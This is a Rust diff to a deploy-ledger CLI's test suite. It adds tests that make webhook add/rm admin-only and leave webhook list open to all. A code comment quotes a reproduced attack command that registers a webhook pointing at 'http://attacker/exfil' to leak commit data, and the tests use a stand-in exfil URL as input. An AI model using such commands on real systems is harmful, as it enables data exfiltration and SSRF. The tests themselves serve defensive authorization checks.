@@ -111,6 +111,25 @@ fn destructive() -> Vec<Vec<&'static str>> {
         // the caller can already read, and gating it locked operators out of
         // seeing their own config. The privileged rbac action is `grant`.
         vec!["rbac", "grant", "mallory@example.com"],
+        // Webhooks are EGRESS CONFIGURATION, not records. `add`/`rm` write
+        // webhooks.json, which later drives an outbound POST from the ledger
+        // host when `pre-deploy` fires. REPRODUCED by a non-admin on an armed
+        // ledger: `webhook add --provider generic --url http://attacker/exfil`
+        // succeeded, `pre-deploy` POSTed commit authors, messages and SHAs to
+        // it, and `webhook rm` removed a legitimate admin's hook —
+        // exfiltration, arbitrary-URL SSRF from the ledger host, and
+        // silencing someone else's alerting.
+        vec![
+            "webhook",
+            "add",
+            "--event",
+            "unexplained-deploy",
+            "--provider",
+            "generic",
+            "--url",
+            "http://127.0.0.1:9/exfil",
+        ],
+        vec!["webhook", "rm", "wh_00000001"],
     ]
 }
 
@@ -800,5 +819,79 @@ fn a_ledger_with_only_authenticated_admins_still_filters() {
         out.contains("Total records:    1"),
         "a ledger configured with only authenticated_admins did not filter:\n{out}"
     );
+    let _ = std::fs::remove_dir_all(&d);
+}
+
+/// Webhook egress config is admin-only to CHANGE and open to READ.
+///
+/// `webhook add`/`rm` sat in the "appends NEW records" group of
+/// `requires_admin`, which they do not do — they write `webhooks.json`. The
+/// exhaustive match guaranteed a decision was made for every command; it
+/// could not catch one decided wrongly. That is why this test exists
+/// separately from the destructive-verb sweep: it names the control too.
+#[test]
+fn changing_webhook_egress_needs_authority_but_listing_does_not() {
+    let d = std::env::temp_dir().join(format!("axon_mx_wh_{}", std::process::id()));
+    let me = real_os_identity();
+
+    // Non-admin: refused, and nothing written.
+    let _ = std::fs::remove_dir_all(&d);
+    seed_auth(&d, "\"alice@example.com\"", "\"somebody-else\"");
+    let (code, out) = run_env(
+        &d,
+        Some("mallory@example.com"),
+        &[],
+        &[
+            "webhook",
+            "add",
+            "--event",
+            "unexplained-deploy",
+            "--provider",
+            "generic",
+            "--url",
+            "http://127.0.0.1:9/exfil",
+        ],
+    );
+    assert_ne!(code, 0, "a non-admin registered an egress webhook:\n{out}");
+    assert!(
+        !d.join("webhooks.json").exists(),
+        "the refused add still wrote webhooks.json"
+    );
+
+    // Reading the config is not gated — same reasoning as `rbac list`.
+    let (code, out) = run_env(&d, None, &[], &["webhook", "list"]);
+    assert_eq!(
+        code, 0,
+        "`webhook list` is a read and must not be gated:\n{out}"
+    );
+
+    // CONTROL: an authenticated admin can still configure egress, or this is
+    // a refusal rather than an authorization check.
+    let _ = std::fs::remove_dir_all(&d);
+    seed_auth(&d, "\"alice@example.com\"", &format!("\"{me}\""));
+    let (code, out) = run_env(
+        &d,
+        None,
+        &[],
+        &[
+            "webhook",
+            "add",
+            "--event",
+            "unexplained-deploy",
+            "--provider",
+            "generic",
+            "--url",
+            "http://127.0.0.1:9/ok",
+        ],
+    );
+    assert_eq!(
+        code, 0,
+        "an authenticated admin must still configure egress:\n{out}"
+    );
+    assert!(
+        d.join("webhooks.json").exists(),
+        "the admin's add wrote nothing"
+    );
+
     let _ = std::fs::remove_dir_all(&d);
 }
